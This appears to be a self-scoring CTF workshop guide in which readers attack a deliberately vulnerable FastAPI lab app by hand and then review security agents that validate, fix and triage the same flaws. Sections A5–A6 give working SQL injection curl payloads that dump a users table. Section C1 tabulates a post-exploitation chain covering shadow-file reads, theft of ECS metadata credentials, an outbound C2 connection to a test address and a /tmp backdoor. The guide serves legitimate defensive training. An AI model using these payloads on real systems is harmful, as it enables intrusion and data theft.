# Wiz Security Lab CTF: Manual vs. Agentic Penetration Testing

> A self-scoring CTF built on the **"Manual vs. Agentic Penetration Testing"**
> lab. You take the *same* vulnerable application and work it two ways, answering
> a question at each step:
>
> - **Section 1 — Manual:** traditional penetration testing, guided by Wiz
>   intelligence (SAST, Code-to-Cloud, Network Exposure, Issues). You do the
>   exploiting; Wiz tells you where to aim.
> - **Section 2 — Agentic: Red Agent** discovers and exploits, **Green Agent**
>   investigates and remediates — automatically. You review their work and compare.
> - **Section 3 — Agentic: Blue Agent** a scheduled job continuously exploits the
>   RCE endpoint in the background; the **Blue Agent** auto-investigates the runtime
>   Threat it raises. You read its verdict. *(Extends beyond the base lab guide.)*
>
> Some answers are **run-specific** (e.g. your EC2 IP or the SQLite version) — you
> capture them from your own tenant rather than matching a fixed string. Each
> challenge has a collapsible **Answer** — try it before you open it.

---

## Lab Setup

| | |
|---|---|
| **Audience** | Technical practitioners: partner SEs, security engineers, pentesters |
| **Time** | ~60 minutes, self-paced |
| **Prerequisites** | A terminal with `curl`, and the two tenant logins provided for the workshop |

You use **two separate Wiz tenants**, both logged in via **Wiz Tenant Manager**
(the console above individual tenants that lets you switch between them from one
login). Both tenants scan the **same** AWS account; each has its own connector.

| Tenant | Used in | Capabilities | Subscription filter |
|--------|---------|--------------|---------------------|
| **Tenant 1** | Section 1 | Standard Wiz (Inventory, SAST, Security Graph, Issues) | `TF-AWS-Connector-AgentWorkshop-...-Tenant1` |
| **Tenant 2** | Sections 2–3 | Red Agent + Green Agent + Blue Agent; Runtime Sensor deployed | `TF-AWS-Connector-AgentWorkshop-...-Tenant2` |

> Switch tenants in the Tenant Manager tenant switcher. If your screen still shows
> the other section's findings, you're in the wrong tenant.

**The target:** a deliberately vulnerable FastAPI service
(`agent-workshop-backend-...`) running on ECS-on-EC2, listening directly on
**port 8000** (no load balancer). Two intentionally insecure endpoints:

- `GET /api/users?username=…` — SQL injection (CWE-89)
- `GET /api/execute?command=…` — OS command injection (CWE-78)

Data lives in an in-memory SQLite `users` table seeded with three users.

**Total: 15 challenges.**

---

## Section 1 — Manual: Finding the Risk (Tenant 1)

> See what Wiz detects on its own — then fill the gap yourself by manually proving
> the finding is exploitable. **A1–A4 are what Wiz sees** (SAST, Code-to-Cloud,
> network exposure). **A5–A6 are the gap you fill** (hands-on exploitation).
> **A7–A8 are what Wiz correlates** (a prioritized issue, still unvalidated).
> Glance at the clock when you start — you'll weigh your hands-on time against the
> agent's unattended run in Section 2.

### A1 — Identify the target
**Q:** Using only Wiz Inventory, locate the internet-exposed VM running the
target and record its public address. What filters get you there, and what is the
host's `Name` tag?

<details><summary>Answer</summary>

- **Inventory → Cloud Resources**, filter **Subscription =
  `TF-AWS-Connector-AgentWorkshop-...-Tenant1`** and **Type =
  `VIRTUAL_MACHINE`**.
- Open the EC2 host tagged **`Name = agent-workshop-backend-...`** and copy its
  **public IP / DNS**. The app listens directly on **port 8000** — no load
  balancer in front.
- Mika shortcut: *"Show me all publicly exposed virtual machines in subscription
  TF-AWS-Connector-AgentWorkshop-...-Tenant1."*

**Answer:** the host's public IP on port 8000, e.g. `<EC2_PUBLIC_IP>:8000` — run-specific.
</details>

### A2 — Review what Wiz SAST already knows
**Q:** Pull the repository's SAST findings. How many HIGH/CRITICAL findings are
open, and what is the exact file:line and CWE of the SQL injection?

<details><summary>Answer</summary>

**Code Security → SAST Findings**, filter **Repository =
`wiz-demo/summit-agent-workshop-backend`**, **Severity = HIGH, CRITICAL**,
**Status = OPEN**. Wiz has already scanned the source and flagged three issues:

| Vulnerability | CWE | Location |
|---|---|---|
| SQL Injection | CWE-89 | `app/main.py:27` — unparameterized query on `GET /api/users` |
| OS Command Injection | CWE-78 | `app/main.py:35-41` — `subprocess.Popen(…, shell=True)` on `GET /api/execute` |
| Insecure CORS | — | `app/main.py:10-16` — `allow_origins=["*"]` with `allow_credentials=True` |

Open the SQL Injection finding to see the exact line, the vulnerable snippet, and
its OWASP mapping (**A03:2021**).

**Answer:** CWE-89 at `app/main.py:27`.
</details>

### A3 — Map code to runtime
**Q:** Confirm what is actually deployed from this repository. What image,
cluster, and task family did Wiz trace the code to?

<details><summary>Answer</summary>

From the SQL Injection finding, click its **related Issue** to see the **Code to
Cloud** correlation (or open **Code to Cloud → Correlations**, or ask Mika: *"Show
me all cloud resources deployed from repository
wiz-demo/summit-agent-workshop-backend."*):

- **Image:** `975800360817.dkr.ecr.us-east-1.amazonaws.com/agent-workshop-backend-...:<git-sha>`
  — Terraform tags each image with the **12-char git short SHA** of the deployed
  commit.
- **Cluster:** `agent-workshop-...` (ECS on EC2)
- **Capacity provider:** `agent-workshop-ec2-...` (single-instance ASG)
- **Task family:** `agent-workshop-backend-...` (container is named `backend`)

**Answer:** image `agent-workshop-backend-...:<git-sha>`, cluster `agent-workshop-...`, task family `agent-workshop-backend-...`.
</details>

### A4 — Analyze network exposure
**Q:** Map the path from the internet to the container. What single port/CIDR
makes this reachable from anywhere?

<details><summary>Answer</summary>

**Security Graph → Network Exposure**, Exposed Entity =
`agent-workshop-backend-...` (or Mika: *"Show me the network exposure path for
container agent-workshop-backend-...."*):

```
Internet (0.0.0.0/0:8000)
  → EC2 host security group (agent-workshop-backend-...)
  → ECS task (bridge network, hostPort 8000)
  → container (backend)
```

Port 8000 is open to the world directly on the EC2 host.

**Answer:** `0.0.0.0/0:8000`.
</details>

### A5 — Exploit the SQL injection (hands-on)
**Q:** Leave the console and prove exploitability. Send a boolean payload that
returns **every** user, then a UNION payload that fingerprints the engine. How
many rows does the boolean return, how many columns must the UNION match, and what
function gives the DB version?

<details><summary>Answer</summary>

The vulnerable code (`app/main.py:27`) selects **4 columns** and runs on
**in-memory SQLite**, so UNION payloads return 4 columns and use
`sqlite_version()` (not `@@version`):

```bash
ENDPOINT="<EC2_PUBLIC_IP>:8000"
curl -I "http://$ENDPOINT/"                                                         # reachable
curl --get "http://$ENDPOINT/api/users" --data-urlencode "username=alice"          # 1 user (baseline)
curl --get "http://$ENDPOINT/api/users" --data-urlencode "username=' OR '1'='1"    # ALL users
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,sqlite_version(),3,4-- "             # version in username field
```

`' OR '1'='1` subverts the `WHERE` clause so every row matches — **3 rows** come
back. The UNION returns a row mapping to **no real user**, with the SQLite version
in the `username` field. That's your proof of exploitation.

**Answer:** 3 rows (boolean); 4 columns and `sqlite_version()` (UNION) — version is run-specific.
</details>

### A6 — Exfiltrate the data (hands-on)
**Q:** Use UNION-based injection to dump the whole `users` table. What is the
**admin** user's email and role?

<details><summary>Answer</summary>

```bash
# Enumerate tables (SQLite uses sqlite_master, not information_schema)
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- "
# Dump every row
curl --get "http://$ENDPOINT/api/users" \
  --data-urlencode "username=' UNION SELECT id,username,email,role FROM users-- "
```

Seeded rows: `alice / alice@example.com / user`, `bob / bob@example.com / user`,
and **`admin / admin@code-challenge.example / admin`**. That last response is a
full table exfiltration through a single query string.

**Answer:** `admin@code-challenge.example`, role `admin`.
</details>

### A7 — Correlate with Wiz Issues
**Q:** Back in the console, find how Wiz prioritizes this. What single issue does
it correlate the SAST finding and runtime exposure into, and at what severity?

<details><summary>Answer</summary>

**Issues → Risk Issues**, filter on `summit-agent-workshop-backend` (or search
"SQL Injection"). Wiz correlates the static finding with runtime exposure into one
prioritized issue:

```
HIGH — SQL Injection in a Publicly Exposed Container
  SAST:     Unparameterized SQL query (app/main.py:27)
  Exposure: Internet-accessible on the EC2 host (0.0.0.0/0:8000)
  Risk:     Data breach / unauthorized access
```

It's prioritized — but still **unvalidated**: Wiz hasn't proven it's exploitable
from the internet. That's the gap Section 2's Red Agent closes.

**Answer:** "SQL Injection in a Publicly Exposed Container" — HIGH.
</details>

### A8 — Assess the blast radius
**Q:** The SQLite data is in-process, but the same host exposes a second endpoint
that escalates the impact. Which endpoint, what class of bug, and what's the next
pivot after shell access?

<details><summary>Answer</summary>

The same host also exposes **`GET /api/execute`** — **OS command injection
(CWE-78)**. Chaining SQL injection → command injection gives **shell access as the
container user**; from there the **EC2 instance role** becomes the next pivot
(cloud credential theft).

**Answer:** `/api/execute`, CWE-78, EC2 instance-role pivot.
</details>

---

## Section 2 — Agentic: Validating & Fixing the Risk (Tenant 2)

> Switch to **Tenant 2** in the Tenant Manager switcher and filter on
> `TF-AWS-Connector-AgentWorkshop-...-Tenant2`. See how the agents close the
> gap — validating exploitability and generating the fix automatically — then
> compare against your manual run.

### B1 — Red Agent: validated exploitation
**Q:** Find the Red Agent finding for the same SQL injection. What is its title,
and what did Red Agent capture that a SAST finding alone cannot?

<details><summary>Answer</summary>

**Findings → Attack Surface**, locate **"SQL / NoSQL Injection via username
parameter on Users API"** on `agent-workshop-backend-...`. Unlike the static
SAST finding, Red Agent captured **Evidence**: the exact payloads it sent, the
responses it got back, and the data it extracted — proof the finding is
**exploitable from the internet**, produced **autonomously and unattended**.

**Answer:** "SQL / NoSQL Injection via username parameter on Users API".
</details>

### B2 — Static HIGH → validated CRITICAL
**Q:** Red Agent's evidence escalated this finding into a validated Issue. From
the finding, follow **Related Issues** — what is the Issue's title, and what
severity did it become?

<details><summary>Answer</summary>

The finding's **Related Issues** link leads to **"Red Agent discovered critical
severity vulnerability / misconfiguration"**. The same finding that sat as a
**HIGH** in Section 1 became a validated **CRITICAL** toxic combination, backed by
payload-and-response evidence.

**Answer:** "Red Agent discovered critical severity vulnerability / misconfiguration" — HIGH → CRITICAL.
</details>

### B3 — Completeness vs. your manual run
**Q:** In Section 1 you proved one vulnerability by hand. How many did Red Agent
find in the same autonomous run, and which ones?

<details><summary>Answer</summary>

**All three:** SQL injection, OS command injection, and insecure CORS — found in
one unattended background run, while your manual pass only reached the SQL
injection.

**Answer:** 3 findings — SQLi + command injection + CORS.
</details>

### B4 — Green Agent: remediation at the source
**Q:** Open Green Agent's analysis on the Issue. What is the exact remediated line
of code it recommends?

<details><summary>Answer</summary>

Green Agent traces the root cause and replaces the string-concatenated query with
a **parameterized** one:

```python
# Vulnerable
query = "SELECT id, username, email, role FROM users WHERE username = '"+username+"'"

# Fixed
query = "SELECT id, username, email, role FROM users WHERE username = ?"
rows = sqlite_db.execute(query, (username,)).fetchall()
```

**Answer:** parameterized query (`username = ?`).
</details>

---

## Section 3 — Runtime Detection & the Blue Agent (Tenant 2)

> *Extends beyond the base lab guide.* Sections 1–2 stopped at finding and fixing
> the vulnerability. Section 3 answers the next question: **what happens when
> someone actually exploits the RCE endpoint while Wiz is watching at runtime?**
>
> The Wiz **Runtime Sensor** is deployed onto this cluster as a daemon. A
> **scheduled job runs continuously in the background**, replaying a
> post-exploitation chain (`scripts/wiz-sensor-abuse.sh`) against the workload
> through `GET /api/execute` on a fixed cadence. **You don't launch anything** —
> fresh detections and threats are always firing on their own; you just
> investigate what's already there. Each run stamps a `wiz-attack-<timestamp>`
> nonce you can grep for in the portal to pin a specific run.

### C1 — Map the kill chain to MITRE ATT&CK
**Q:** The background chain fires five stages. Match each to its MITRE technique
and the artifact it touches.

<details><summary>Answer</summary>

| Stage | Behavior | MITRE | Artifact |
|---|---|---|---|
| 1 | Discovery | **T1082** | `id; whoami; uname -a` |
| 2 | OS credential dumping | **T1003** | reads `/etc/shadow` |
| 3 | Cloud credential theft | **T1552.005** | ECS task metadata at `169.254.170.2` |
| 4 | C2 / exfil channel | **T1071 / T1095** | outbound to `198.51.100.7:4444` (TEST-NET-3, RFC 5737) |
| 5 | Persistence | **T1546** | writes + `chmod +x /tmp/.backdoor.sh` |

Stage 3 is the real-world pivot foreshadowed in A8: shell access → steal the
ECS/EC2 role credentials from the metadata endpoint.

**Answer:** T1082 → T1003 → T1552.005 → T1071/T1095 → T1546.
</details>

### C2 — Find the Threat in Wiz Defend
**Q:** A few minutes after a background run, Wiz Defend correlates the detections
into a Threat on the workload. Where do you find it, and what status filter?

<details><summary>Answer</summary>

**Wiz Defend → Threats**, filtered to **status OPEN / IN_PROGRESS**, on the
`agent-workshop-backend-...` workload. The sensor detections (e.g. the
anomalous `/etc/shadow` read) correlate into a Threat. The exact Threat ID is
**run-specific** — threats regroup per run — so open the most recent one on the
workload and match the `wiz-attack-<timestamp>` nonce from the run.

**Answer:** Wiz Defend → Threats, status OPEN / IN_PROGRESS, on `agent-workshop-backend-...` — run-specific.
</details>

### C3 — Read the Blue Agent's verdict
**Q:** Open the Threat. The Blue Agent has already investigated it with no one at
the keyboard. What outputs does it produce, and what verdict did it land on for
this chain?

<details><summary>Answer</summary>

The **Wiz Blue Agent** (the SecOps AI Agent) auto-investigates every new or
updated Threat, finishing in about a minute. It produces a **Verdict**,
**Conclusion**, **Confidence level**, **Investigation process**, and **Severity**.

For this chain the recorded verdict is **Security Test** with **High** confidence:
the Blue Agent recognizes the `wiz-attack-*` markers in the commands, the
non-routable TEST-NET-3 C2 target (`198.51.100.7`), and the workshop-named tenant,
and concludes it's an authorized exercise rather than a real intrusion. Read the
actual verdict + confidence off your own Threat.

**Answer:** Verdict = **Security Test**, confidence **High** — run-specific.
</details>

---

## Scoreboard

| # | Challenge | Section | Answer |
|---|---|---|---|
| A1 | Identify the target | Manual | host public IP on port 8000 *(run-specific)* |
| A2 | Review Wiz SAST | Manual | CWE-89 at `app/main.py:27` |
| A3 | Map code to runtime | Manual | image/cluster/task `agent-workshop-...` |
| A4 | Analyze network exposure | Manual | `0.0.0.0/0:8000` |
| A5 | Exploit the SQL injection | Manual | 3 rows; 4 cols + `sqlite_version()` *(run-specific)* |
| A6 | Exfiltrate the data | Manual | `admin@code-challenge.example`, role `admin` |
| A7 | Correlate with Wiz Issues | Manual | "SQL Injection in a Publicly Exposed Container" — HIGH |
| A8 | Assess the blast radius | Manual | `/api/execute`, CWE-78, instance-role pivot |
| B1 | Red Agent validated exploitation | Agentic | "SQL / NoSQL Injection via username parameter on Users API" |
| B2 | HIGH → CRITICAL | Agentic | "Red Agent discovered critical severity vulnerability / misconfiguration" |
| B3 | Completeness | Agentic | 3 findings — SQLi + command injection + CORS |
| B4 | Green Agent fix | Agentic | parameterized query (`username = ?`) |
| C1 | MITRE kill chain | Runtime | T1082 → T1003 → T1552.005 → T1071/T1095 → T1546 |
| C2 | Find the Threat in Wiz Defend | Runtime | Wiz Defend → Threats, OPEN/IN_PROGRESS *(run-specific)* |
| C3 | Blue Agent verdict | Runtime | Security Test, High confidence *(run-specific)* |

**Total: 15 challenges.**

## Wrap-Up

- Without agents, Wiz gives full visibility across Code, Build, Cloud, and Runtime
  — but the finding stays static. Proving exploitability is manual work.
- **Red Agent** closes the validation gap: it proves which findings are
  exploitable from the internet, escalating them from static HIGH to validated
  CRITICAL.
- **Green Agent** closes the remediation gap: it traces the finding back through
  the deployment pipeline and generates a fix at the root cause.
- **Blue Agent** closes the runtime gap: when the RCE endpoint is exploited by the
  scheduled background chain, it auto-investigates the resulting Threat and returns
  a verdict before a human opens it.
- The strongest program combines all three: agents for validation, remediation, and
  runtime triage at scale; people for context and edge cases.

### Take It Further

- Point Red Agent at your own demo or dev tenant and replay the payloads it
  reports with `curl` to confirm they reproduce.
- Trace one correlated Issue back to its inputs (SAST finding + network exposure +
  identity) to see how Wiz decides what's critical versus noise.
- Apply Green Agent's fix to a branch and confirm the rescan clears the finding —
  that finding → merged fix → clean rescan round-trip is the part worth getting
  fluent in.
